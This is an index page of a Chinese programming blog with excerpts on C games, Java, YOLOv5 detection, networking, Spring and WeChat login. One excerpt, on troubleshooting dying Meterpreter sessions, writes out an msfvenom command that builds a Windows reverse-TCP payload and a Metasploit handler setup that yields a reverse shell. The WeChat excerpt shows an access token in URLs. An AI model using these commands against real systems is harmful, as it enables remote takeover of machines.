<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="菜鸟程序员博客">
		<meta property="og:title" content="菜鸟程序员博客" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/479a2411883292d7901aac0b9629ba95/" rel="bookmark">
			c语言实现三子棋小游戏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		欢迎来到程序员的快乐！
目录
一、游戏规则：
二、编程准备和分析：
三、游戏菜单界面打印
四、创建字符数组存储数据
五、初始化棋盘
六、棋盘打印
七、玩家1，玩家2轮流下棋
八、判断游戏胜出、平局、继续
九、、游戏测试 十、总体代码：
一、游戏规则： 两位玩家进行博弈，棋盘为3*3，当一方玩家的3个棋子连成一条线的时候胜利。如果棋盘上没有落子的位置且没有玩家胜出的时候判定为平局。
二、编程准备和分析： 1、准备
game.h：游戏相关的函数声明，头文件包含，符号声明。
text.c:测试游戏的逻辑。
game.c：游戏相关函数的实现。
2、分析：
可能出现的四种游戏状态：玩家1胜、出玩家2胜、平局、游戏继续。
可能不是很熟悉的语法：#define 定义的标识符常量。
三、游戏菜单界面打印 1、自己动手来给三子棋写一个menu()函数实现菜单界面的打印。
void menu() { printf("----------- Tic-Tac-Toe -----------\n"); printf("*********** 1.开始游戏 ************\n"); printf("*********** 0.退出游戏 ************\n"); printf("-----------------------------------\n"); } 2、在主函数中使用do...while循环语句和switch多分支语句，选择不同选项出现不同效果，我们暂时输出一句话来展现不同的效果。input是我们定义的一个变量，并把它当做循环和分支的条件表达式，当input = 1时开始游戏，input = 0 时退出游戏并且退出循环，input= 其它值时打印出一句错误提醒！
int main() { int input = 0; do { menu(); printf("请输入选项:&gt;\n"); scanf("%d", &amp;input); switch (input) { case 1: printf("游戏开始！\n"); break; case 0: printf("退出游戏！\n"); break; default: printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/479a2411883292d7901aac0b9629ba95/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/554ec384ff88504074b07c31c90b835b/" rel="bookmark">
			使用Java的PrinterJob实现调用打印机打印
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先我们在使用打印机的话我们需要得到我的这个相关的一些数据，然后我们需要实例化我的这个book对象，这个book对象主要是把我的这个paperFormat对象和我的这个实体类数据的对象放入到我的这个book对象当中，那么我的paperFormat主要是用来设置我的这个打印机打印的顺序，那么说到顺序他一共有三种顺序，第一种就是从下到上从左到右打印，第二种就是从上到下从左到右的方向打印，第三章就是从上到下，从右到左的方向打印，相关的底层源代码如下
设置完我的这个打印方向了之后，我就需要实例化一个Paper对象，这个对象主要是用来设置我的这个纸张的大小和我需要打印字体的打印区域以及字与字体的行距与间距设置完之后paperFormat的这个对象里面有个setPaper的属性，他专门就是用来把Parper对象存入的，来获得我的这个打印纸张的具体信息，这下我们的这个paperFormat已经没问题了之后按照上面所说的把我这个paperFormat和实体类在这里需要特别注意一下，我的这个实体类需要强制转换成Printable类型，放到book对象中，其次到了我们最关键的时候了，那就是用来获取我的这个打印服务对象，我们必须要得到这个对象去获得我的这个打印驱动，那么如何得到呢，通过Parinter.getPrinterJob()得到我的这个打印机驱动对象PrinterJob，然后得到我的这个驱动对象我们就把我们刚刚设置好的book对象放入到这个PrinterJob中的setPageable的属性当中，最终我们使用PrinterJob对象去调用print()方法,这个print()会抛出一个PrinterException的异常，我们需要去捕捉一下即可，去链接打印机打印，具体代码如下：
package com.prints; import com.printsActual.pojo.CheckGroup; import java.awt.print.*; public class prties { /** * 订单信息 实体类 */ private CheckGroup checkGroup; /** * 带参构造方法，把我的这个订单信息传入到打印机工具类 * @param checkGroup */ public prties(CheckGroup checkGroup) { this.checkGroup = checkGroup; } /** * 开始打印的方法 */ public void printer() { try { //Book 类提供文档的表示形式，该文档的页面可以使用不同的页面格式和页面 painter Book book = new Book(); //要打印的文档 //PageFormat类描述要打印的页面大小和方向 PageFormat pf = new PageFormat(); //初始化一个页面打印对象 pf.setOrientation(PageFormat.PORTRAIT); //设置页面打印方向，从上往下，从左往右 //设置打印纸页面信息通过Paper设置页面的空白边距和可打印区域。必须与实际打印纸张大小相符。 Paper paper = new Paper();//调用我的这个纸面的对象 paper.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/554ec384ff88504074b07c31c90b835b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d4a2d4609d27e7e34b3e17ba6c5462c/" rel="bookmark">
			基于改进YOLOv5的红外图像行人目标检测方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景技术
行人检测要求准确判断输入图像或视频是否包含行人，并给出行人在图像中的空间坐标信息，广泛应用于智能监控、地区侦查、人体行为理解、自动驾驶等领域。与传统的基于可见光的行人检测任务相比，红外成像抗干扰能力强、受光线和恶劣天气影响小，具备全天时工作的能力。但是红外图像对比度较低、纹理特征弱、干扰大，行人目标在强噪声和相似背景的影响下，成为弱小目标；传统的基于人工提取特征检测的方式利用选取的区域人工设计提取特征，对于提取的特征进行学习并用分类器进行分类，此类方法需通过滑动窗口实现，时间复杂度较高，且鲁棒性不强，很难保障红外行人检测的精度和实时性。深度学习的出现，使得红外行人目标检测有了突破性进展，特别是基于回归的单阶段目标检测YOLO模型，增强了红外行人目标检测的鲁棒性并提高了检测准确率和检测速度。
河南大学在其拥有的发明专利技术申请“基于改进YOLOv3的红外图像弱小目标检测方法”(专利申请号：2020109263845，公开号：CN112101434A)中公开了一种基于改进YOLOv3的红外图像弱小目标检测方法，用于红外行人目标检测。该发明在网络的每个残差块中引入了通道和空间注意机制，通过叠加残差块中产生的注意感知特征，将图像中的关键信息提取出来；用边界框的重叠程度和两个边界框的中心距离即CIoU(CompleteIntersection over Union)作为边界框的损失函数，使预测框与真实框之间更加地切合；用GIoU(Generalized Intersection over Union)和两边界框中心点距离作为非极大值抑制NMS(Non-Maximum Suppression)算法中筛选候选框的阈值并使用高斯模型抑制周围边界框；还通过深度可分离卷积代替标准的卷积运算，并采用Hard-swish作为更深层次网络的激活函数。这种方法在红外行人小目标检测精度上取得了一定的效果，但是距离实际应用还有一定的差距。
史健婷、张贵强在论文“改进的YOLOv3红外图像行人检测算法”(黑龙江科技大学学报2020年30卷4期第442页到447页)中提出了一种基于YOLOv3的红外行人监控算法，可提高低像素及小目标检测环境中行人检测的准确率。该方法根据实际检测情况在YOLOv3的基础上进行优化，借鉴了DenseNet密集连接的改进方案，优化主干网络，加强了模块与模块间的特征传递，对网络检测部分二次优化浅层和深层融合后的特征信息，增强了特征信息的传递能力。这种方法利用网络结构的特征优化主干网络，通过二次优化浅层和深沉融合后的特征信息完善信息的丰富度，对灰度图及小目标的检测有一定的提升，但整体准确率改进有限。
发明内容
本发明的目的在于提供一种基于改进YOLOv5的红外图像行人目标检测方法，以解决背景技术中现有的红外图像检测方法存在的准确率不足等问题。
为了实现上述目的，本发明采用以下技术方案：
一种基于改进YOLOv5的红外图像行人目标检测方法，包括以下步骤：
步骤1：构建基于改进YOLOv5的红外图像行人目标检测深度学习模型，具体的：
步骤1.1：压缩输入通道，将YOLOv5目标检测模型输入端的3通道输入压缩为单通道输入；
步骤1.2：拓展YOLOv5目标检测模型骨干网络CSPDarknet中浅层跨阶段局部网络模块的厚度，提取红外图像行人目标在浅层的细节特征；
步骤1.3：引入注意力机制，所述的注意力机制用于骨干网络特征提取过程中加强红外图像行人目标特征的提取；
步骤1.4：在YOLOv5目标检测模型的PANet特征融合网络的上采样模块中，增加一个上采样层，所述的上采样层是在8倍、16倍和32倍上采样层的基础上，增加的4倍上采样层；
步骤1.5：在YOLOv5目标检测模型的PANet特征融合网络中，增加一个Concatenate融合层，将步骤1.4中所述的增加的4倍上采样层与骨干网络特征提取过程中得到的相同尺寸的特征图通过增加的Concatenate融合层进行特征融合，产生的4倍上采样的特征图；
步骤1.6：增加小目标检测层，将步骤1.5中所述的4倍上采样的特征图用于小目标的检测，基于改进YOLOv5的红外图像行人目标检测深度学习模型增加为4种尺度的预测层，用于Head部分的多尺度检测；
步骤1.7：根据步骤1.6增加的小目标检测层，增加一组小目标尺寸的锚点框，采用K-means自适应算法获取符合红外图像行人小目标尺度特点的锚点框；
步骤2：建立红外图像行人检测数据集，具体的：
步骤2.1：建立红外图像行人检测训练集、验证集和测试集，随机选取60％的红外图像行人检测数据作为训练集，20％的红外图像行人检测数据作为验证集，20％的红外图像行人检测数据作为测试集；
步骤2.2：对建立的红外图像行人检测训练集、验证集和测试集进行预处理，采用Mosaic算法实现红外行人数据的数据增强；
步骤3：训练步骤1中构建的基于改进YOLOv5的红外图像行人目标检测深度学习模型，具体的：
步骤3.1：设置训练参数，利用随机优化算法Adam进行训练，训练批次的大小设置为Batch＝64，动量Momentum＝0.9，学习率初始设定为Ir＝0.001，训练迭代次数Epoch＝300；
步骤3.2：将步骤2.2预处理后的红外图像行人检测训练集和验证集送入步骤1中构建的基于改进YOLOv5的红外图像行人目标检测深度学习模型；
步骤3.3：自适应缩放图片尺寸，根据网络设定的输入图片尺寸大小实现自适应红外图像行人检测训练集和验证集图片的缩放；
步骤3.4：训练基于改进YOLOv5的红外图像行人目标检测深度学习模型，根据训练集和验证集交叉验证的平均精度变化和损失变化趋势，调整学习率和迭代次数，直至精度变化和损失变化逐步趋于稳定的状态，确定最终的学习率和迭代次数；
步骤3.5：根据步骤3.4确定的学习率和迭代次数，完成基于改进YOLOv5的红外图像行人目标检测深度学习模型的训练，得到收敛良好的基于改进YOLOv5的红外图像行人目标检测深度学习模型；
步骤4：将步骤2.2预处理后的红外图像行人检测测试集送入步骤3.5中训练好的基于改进YOLOv5的红外图像行人目标检测深度学习模型，测试基于改进YOLOv5的红外图像行人目标检测深度学习模型的性能；
步骤5：评估模型，具体的：
根据步骤4的测试结果，从平均检测精度和检测速度上对步骤3训练的基于改进YOLOv5的红外图像行人目标检测深度学习模型进行评估；
步骤6：判断基于改进YOLOv5的红外图像行人目标检测深度学习模型评估结果的检测精度和速度是否满足实际应用需求，若基于改进YOLOv5的红外图像行人目标检测深度学习模型满足实际应用需求，则执行步骤8，否则，执行步骤7；
步骤7：修正步骤1构建的基于改进YOLOv5的红外图像行人目标检测深度学习模型的宽度和深度，并跳转至步骤3.4重新训练；
步骤8：将步骤6中满足实际应用需求的基于改进YOLOv5的红外图像行人目标检测深度学习模型用于红外图像或红外视频中行人目标的检测。
步骤1.3中所述的注意力机制选用改进的SK注意力机制，分为Split、Fuse、Scale三部分，具体的，步骤1.3具体包括以下步骤：
步骤1.3.1：Split操作，具体的：
将输入的特征图利用3×3和5×5两个卷积核进行卷积，分别得到输出特征向量U1和U2，U1和U2相加之后得到特征向量U；
步骤1.3.2：根据步骤1.3.1得到的特征向量U，进行Fuse操作，具体的：
用全局平均池化Fgp将矩阵压缩到1×1×C，用一个通道描述符表示每个通道的信息，建立通道间的依赖关系，如公式(1)所示，再通过两个全连接层Ffc操作使得通道间的关系是灵活的并且非线性的，输出经过sigmoid激活函数得到权重值，如公式(2)所示：
Ffc(Fgp，ω)＝σ(B(Fgp，ω))； (2)
其中，C表示通道数channel，W和H分别为图像的宽和高，i和j分别为图像的第i行和第j列，ω为相应的权重，σ为sigmoid激活函数，B为批归一化操作；
步骤1.3.3：Scale操作：
将步骤1.3.1中得到的特征向量U1和U2及步骤1.3.2中得到的权重值进行加权操作，得到SK注意力机制最终输出的加权特征图Fscale(U，Ffc)，其中，U表示特征向量，Ffc表示步骤1.3.2中得到的权重值，Fscale(U，Ffc)加权计算如公式(3)所示：
Fscale(U，Ffc)＝V1+V2＝U1·Ffc+U2·Ffc； (3)
其中，V1和V2分别为特征向量U1和U2的加权后的特征向量。
步骤2中，所述的建立的红外图像行人检测数据集选用公共数据集KAIST，并将目标类别设置people和person两个行人类别。
步骤3.2中，所述的将步骤2.2预处理后的红外图像行人检测训练集和验证集送入步骤1中构建的基于改进YOLOv5的红外图像行人目标检测深度学习模型时，自动删除KAIST数据集中不包含行人目标的红外图像。
与现有技术相比，本发明的有益效果为：
第一，由于本发明改进了骨干网络结构CSPDarknet中浅层CSP模块的厚度，使得特征提取网络更加关注浅层特征的提取，能更加彻底地提取浅层细节特征和深层高级语义特征；
第二，由于本发明在CSP模块中引入改进的SK注意力机制模块，从通道维度对行人目标进行加权融合，迫使网络关注红外行人图像中不同尺度的目标，以更好的学习鲁棒性和可辨别性特征；
第三，针对红外摄像距离远、目标小的问题，本发明改进了网络检测头结构，增加多尺度目标检测层，采用4级空间金字塔池化(Spatial Pyramid Pooling)增大感受野，提高红外行人小目标检测精度；
第四，本发明无论从检测精度、检测速度还是网络参数、权重文件等与YOLO v3红外行人图像目标检测相比都有一个质的提高，平均精度提高了约30.6％，mAP50达到了98.3％，mAP50：75也达到了95.6％；另外，检测时间减少约62％，网络参数减少约89％，权重文件减少94％以上，计算量减少84％以上。
附图说明
为了更清楚地说明本发明具体实施方式或现有技术中的技术方案，下面将对具体实施方式或现有技术描述中所需要使用的附图作简单地介绍，显而易见地，下面描述中的附图是本发明的一些实施方式，对于本领域普通技术人员来讲，在不付出创造性劳动的前提下，还可以根据这些附图获得其他的附图。
图1为本发明的方法流程图；
图2是本发明的检测网络结构示意图；
图3是本发明的检测结果的示例图。
具体实施方式
下面将结合附图对本发明的技术方案进行清楚、完整地描述，显然，所描述的实施例是本发明一部分实施例，而不是全部的实施例。基于本发明中的实施例，本领域普通技术人员在没有做出创造性劳动前提下所获得的所有其他实施例，都属于本发明保护的范围。
如图1所示：本发明所述的一种基于改进YOLOv5的红外图像行人目标检测方法，包括以下步骤：
步骤1：构建基于改进YOLOv5的红外图像行人目标检测深度学习模型；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d4a2d4609d27e7e34b3e17ba6c5462c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/025d41cf4967a166b30074d413c6028c/" rel="bookmark">
			计算机网络学习笔记（一）---物理层，数据链路层以及网络层
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		计算机网络学习笔记 基本概念三种交换方式计算机网络的定义和分类1.5 计算机网络的性能指标1.6 常见的计算机网络体系结构 2. 物理层2.1 物理层的基本概念2.2 物理层下面的传输媒体2.3 传输方式2.4 编码和调制2.5 信道的极限容量 3. 数据链路层3.1 数据链路层概述3.2 封装成帧3.3 差错检测3.4 可靠传输3.4.1 可靠传输的基本概念3.4.1 可靠传输的实现机制-停止等待协议SW3.4.2 可靠传输的实现机制-回退N帧协议GBN3.4.1 可靠传输的实现机制-选择重传协议SR 3.5 点对点协议PPP3.6 媒体接入控制MAC3.6.1 媒体接入控制的基本概念3.6.2媒体接入控制——静态划分信道3.6.3 媒体接入控制——CSMA/CD协议-总线局域网3.6.4 媒体接入控制——CSMA/CA协议-无线局域网习题 3.7 Mac地址，IP地址以及ARP协议3.7.1 MAC地址3.7.2 IP地址3.7.3 ARP协议-地址解析协议3.7.4 小结 3.8集线器与交换机的区别3.9以太网交换机自学习和转发帧的流程3.10以太网交换机的生成树协议STP3.11 VLAN3.11.1 概述3.11.2 VLAN的实现机制 4.网络层4.1 概述4.2 网络层提供的两种服务4.3.1 IPv4地址概述4.3.2分类编址的IPv4地址4.3.3 划分子网的Ipv4地址4.3.4 无分类编址的IPv4地址4.3.5 IPv4地址的应用规划 4.4 IP数据报的转发过程4.5静态路由配置及其可能产生的路由环路问题4.6 路由选择协议4.6.1路由选择协议概述4.6.2路由信息协议RIP的基本工作原理4.6.3开放最短路径优先OSPF的基本工作原理4.6.4边界网关协议BGP的基本工作原理 4.7 IPv4数据报的首部格式4.8 网际控制报文ICMP![在这里插入图片描述](https://img-blog.csdnimg.cn/367158a07dad47eaa7319fc3fbd95b5a.png)4.9虚拟专用网VPN与网络地址转换NAT 计算机网络微课堂（有字幕无背景音乐版）
基本概念 ISP： Internet Service Provider 因特网服务提供者，
如国内三大网络运营商： 电信，移动，联通
可靠传输的实现机制：停止等待协议，回退N帧协议，选择重传协议
退避算法： 如果检测到信道占用，则根据退避算法退避一段时间
TCP基于以字节为单位的滑动窗口来实现可靠传输
三种交换方式 三种交换方式：
电路交换：
分组交换： 路由器
发送方：构造分组， 发送分组路由器：缓存分组，转发分组接收方：接收分组，还原报文 报文交换
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/025d41cf4967a166b30074d413c6028c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb977499591cf989812e0b775af6ddd2/" rel="bookmark">
			C语言实现扫雷游戏完整代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 游戏整体框架游戏具体功能及实现整体代码 一、雷盘的定义 1.雷盘的定义
对于扫雷游戏，我们遇到的第一个问题就是：应该如何表示扫雷的雷盘及如何存放布雷、排雷的数据；我们发现，二维数组可以很好的解决这个问题。
#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;time.h&gt; #define ROW 9 #define COL 9 #define ROWS ROW+2 #define COLS COL+2 void game() { //设计2个数组存放信息 char mine[ROWS][COLS] = { 0 }; char show[ROWS][COLS] = { 0 }; 2、雷盘的初始化 最开始的时候我们把mine数组元素全部初始化为字符0，把show数组元素全部初始化为字符*
void init_board(char board[ROWS][COLS], int rows, int cols, char set) { int i = 0; int j = 0; for (i = 0; i &lt; rows; i++) { for (j = 0; j &lt; cols; j++) { board[i][j] = set; } } } 3、布置雷 对于布置雷我们有两个需要注意的地方：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cb977499591cf989812e0b775af6ddd2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0dec82462dafce945c187625d8fda610/" rel="bookmark">
			Meterpreter session 3 closed.Reason: Died 救救我的session
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题
🍺用的挺好的MSF突然出了问题，直接裂开
如下图，Meterpreter session异常终止
当你试着发现问题时
只会不断增加session值
🍺参考文章
垂死挣扎？拯救你的Meterpreter session
🍺根据自己的环境情况，判断出现的问题
我这里出现两个问题：
1、架构混淆(32位/64位)，在使用Metasploit时，在选择处理器体系结构时犯错误，将它们混淆在一起
🍺解决的办法是：
确保不要在msfvenom和msfconsole中混用了处理器体系结构，两端只能使用32位或64位payloads，32位、64位payloads示例：
2、payload不匹配，我们可能在msfvenom中指定使用windows/meterpreter/reverse_https模块payload，而在msfconsole中，却错误地选择了windows/meterpreter/reverse_tcp模块payload
🍺解决方法：对payload的匹配
(1)、生成独立的meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=5555 -f exe &gt; 5115.exe (2)、设置multi handler listener
msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp msf5 exploit(multi/handler) &gt; set LHOST 192.168.0.106 msf5 exploit(multi/handler) &gt; set LPORT 5555 msf5 exploit(multi/handler) &gt; run 🍺了解出现的问题，重新来一次
执行exe文件的是windows64位电脑，所以选择windows/64位的，同时确保multi handler listener使用的payload与前面生成exe文件所使用的windows/x64/meterpreter/reverse_tcp是一样的
成功反弹Shell
感想：回过头看看，今天确实傻里傻气的，，，，，折腾了大半天，啥跟啥啊(裂开)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d30a7378f66de9c98a20c37f1a0caa7c/" rel="bookmark">
			python 图像相减的不同方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于图像相减采用如下方法进行结果对比，本案例中采用灰度图像
gray_img.jpg 如下：
gray_cur.jpg如下：
不同算法图像相减之后得结果：
1、采用矩阵直接相减：diff = gray_cur - gray_pre
结果很不好，有很多噪点
2、cv2.subtract（）在相差结果小于0的时候强制为0，所以才有以下两个不同的结果
diff = cv2.subtract(gray_cur, gray_pre)
diff = cv2.subtract(gray_cur, gray_pre)
3、diff = cv2.absdiff(gray_cur, gray_pre)
取差的绝对值，这个应用起来结果相对好
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f2b87d175871849153aa45237350748/" rel="bookmark">
			Springboot是什么？Springboot详解！入门介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spring Boot概述 Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化Spring应用的创建、运行、调试、部署等。使用Spring Boot可以做到专注于Spring应用的开发，而无需过多关注XML的配置。Spring Boot使用“习惯优于配置”的理念，简单来说，它提供了一堆依赖打包，并已经按照使用习惯解决了依赖问题。使用Spring Boot可以不用或者只需要很少的Spring配置就可以让企业项目快速运行起来。
Spring Boot是开发者和Spring 本身框架的中间层，帮助开发者统筹管理应用的配置，提供基于实际开发中常见配置的默认处理（即习惯优于配置），简化应用的开发，简化应用的运维；总的来说，其目的Spring Boot就是为了对Java web 的开发进行“简化”和加“快”速度，简化开发过程中引入或启动相关Spring 功能的配置。这样带来的好处就是降低开发人员对于框架的关注点，可以把更多的精力放在自己的业务代码上。
同时随着微服务概念的推广和实践，Spring Boot的精简理念又使其成为Java微服务开发的不二之选，也可以说，Spring Boot其实就是为了微服务而生的Java web框架。
先如今，Spring Boot已经在蓬勃发展的快速应用开发领域(rapid application development)成为领导者
1.2.2 Spring Boot的核心功能 1、 可独立运行的Spring项目：Spring Boot可以以jar包的形式独立运行。
2、 内嵌的Servlet容器：Spring Boot可以选择内嵌Tomcat、Jetty或者Undertow，无须以war包形式部署项目。
3、 简化的Maven配置：Spring提供推荐的基础 POM 文件来简化Maven 配置。
4、 自动配置Spring：Spring Boot会根据项目依赖来自动配置Spring 框架，极大地减少项目要使用的配置。
5、 提供生产就绪型功能：提供可以直接在生产环境中使用的功能，如性能指标、应用信息和应用健康检查。
6、 无代码生成和xml配置：Spring Boot不生成代码。完全不需要任何xml配置即可实现Spring的所有配置。
我们的主要目标是：
为所有Spring开发提供一个更快，更广泛的入门体验。立即开始斟酌，但随着需求开始偏离默认值，快速避开提供大型项目（如嵌入式服务器，安全性，指标，运行状况检查和外部配置）通用的一系列非功能性功能。绝对不会生成代码，并且不需要XML配置。 1.2.3SpringBootB的相关好处 A.为什么要用SpringBoot？
B.什么是SpringBoot？
C.SpringBoot与SpringCloud 的区别？
D.SpringBoot与SpringMVC 的区别？
（一）为什么要用SpringBoot？
以往的项目整合起来是比较繁琐复杂的，而且存在架包冲突的问题，这时候SpringBoot应运而生了，SpringBoot也就是用来做这个的。
（二）什么是SpringBoot？
SpringBoot是一个快速开发的框架，能过快速整合第三方框架，他是如何快速整合的呢？其实他是的基本原来是Maven依赖关系，Maven的集成，完全采用注解化，简化XML配置，内嵌HTTP服务器（Tomcate，jetty），默认嵌入Tomcate，最终以Java应用程序进行执行。
总结一下：
1.SpringBoot是微服务框架（网上很多这样说的朋友，其实并不合理，后面我们总结也SpringCloud的时候在细说）
2.SpringBoot核心：快速整合第三方框架
3.SpringBoot原理：Maven依赖关系，Maven的继承，完全采用注解化，Spring3.0以后采用注解方式启动SpringMVC
(三）SpringBoot与SpringCloud 的区别？
1.SpringBoot快速开发框架，快速整合第三方框架（Maven依赖关系###Maven继承），完全采用注解化，简化XML配置，最终以java应用程序进行执行。
2.SpringCloud一套目前完整的微服务解决框架，功能非常强大，注册中心，客户端调用工具，服务治理（负载均衡，断路器，分布式配置中心，网管，消息总线等）。
3.关系：微服务通讯技术Http+json（restfull）轻量级，SpringBoot Web组件默认集成SpringMVC,SpringCloud依赖于SpringBoot实现微服务，使用SpringMVC编写微服务接口。
总结：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f2b87d175871849153aa45237350748/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b97af620bd27d740c5a15601050834aa/" rel="bookmark">
			Lombok的 @EqualsAndHashCode()注解 实现equals（）对父类的调用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先是文档对该注解的介绍： 在类之间存在父子关系的时候，往往需要考虑 equals（）方法要依据哪些属性来比较，lombok默认的equals（）是根据本类的属性来比较，但是在实际需中往往需要使用他的父类参与比较。 例如：son类有两个一模一样的对象，但是他们的father不一样，这个时候如果使用默认的equals()判断，两个son对象equals（）结果是true ,但是实际想要的是false， 这时候只就需要在注解中加上
callSuper = true 即添加 @EqualsAndHashCode(callSuper = true) 即可在son对象 调用equals（）时比较时候，将父类的对象也参与比较。得到想要的结果。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a005d33b361d74c6294714154276795c/" rel="bookmark">
			@Bean和@Autowired、@Resource之间的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@Bean 修饰的方法表示初始化一个对象并交由Spring IOC去管理,@Bean 只能和@Component @Repository @Controller @Service @Configration 配合使用.
@Autowired 可修饰变量和方法,用于完成自动装配(将需要的外部资源注入)
@Resource是java提供的注解，和@Autowired雷系
@Bean和@Autowired的区别 网站上看到一个问题：
为什么@Autowired在这种情况下不能使用？ @SpringBootApplication public class Application { @Autowired BookingService bookingService; public static void main(String[] args) { bookingService.book("Alice", "Bob", "Carol"); } } 但可以使用 @Bean @SpringBootApplication public class Application { @Bean BookingService bookingService() { return new BookingService(); } public static void main(String[] args) { ApplicationContext ctx = SpringApplication.run(Application.class, args); BookingService bookingService = ctx.getBean(BookingService.class); bookingService.book("Alice", "Bob", "Carol"); } } 区别：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a005d33b361d74c6294714154276795c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80973f20010f750fbc5964184c030ac7/" rel="bookmark">
			java微信公众号扫码登录对接流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		调用微信获取带参数的二维码，返回一个ticket。把ticket拼一个二维码，把完整的二维码地址和ticket返回给前端前端通过ticket轮训接口，是否可以登录。我们后台接收来自微信那边的回调，如果是关注则把回调给的ticket和openId绑定，如果是取消，则不管前端轮训接口发现已经关注了，则把这个接口当成登录接口 ，我们建一张关系表，吧openId存起来，如果有数据，则代表已经注册了，则根据用户id去查用户表，直接把用户数据返回给前端，否则让绑定手机号码 准备工作
一个域名，可发布的。我是找公司的运维，吧公网https域名映射到我本地当测试。需要注意的是，ip是没有用的，要域名 一个服务号，我是叫运营部给的。私人的公众号是不行的，除非只是做测试，但后面也会出现一系列问题 至于微信那么，无非就是请求几个接口
这是提供测试的网站
https://mp.weixin.qq.com/debug/cgi-bin/sandboxinfo?action=showinfo&amp;t=sandbox/index
1.查询用户信息，accesstoken和openId自己改
https://api.weixin.qq.com/cgi-bin/user/info?access_token=49_fyoVjStWztl_pUti2aejdm8KshaQZSqrtiW7Da72ftTmeLxcPRREZQBKnxS_n28t1dhYyw5RcNuILZGTpu2Dz91fDbHheeAKdsVjJ1wuUj9gfm7gOFRkT5SFtYC3TNmOlnSbpX9au84iWc6LPZEdAFAFPU&amp;openid=ogLGa52HnfjOMwm2SHoQwkDQgeB4&amp;lang=zh_CN
2.创建带参数的二维码的
https://api.weixin.qq.com/cgi-bin/qrcode/create?access_token=49_fyoVjStWztl_pUti2aejdm8KshaQZSqrtiW7Da72ftTmeLxcPRREZQBKnxS_n28t1dhYyw5RcNuILZGTpu2Dz91fDbHheeAKdsVjJ1wuUj9gfm7gOFRkT5SFtYC3TNmOlnSbpX9au84iWc6LPZEdAFAFPU
3.展示二维码的
https://mp.weixin.qq.com/cgi-bin/showqrcode?ticket=gQEm8DwAAAAAAAAAAS5odHRwOi8vd2VpeGluLnFxLmNvbS9xLzAyWjJCaEZuME5lcUQxakpVYzF4MTgAAgTlMUxhAwQIBwAA
登录微信公众平台，配置回调地址https://mp.weixin.qq.com/ URL是你想要回调的地址；
这个token要记住，如果你找不到，等下全局找我的代码javen就可以了；
EncodingAESKey没发现有什么用，随机生成就可以了。
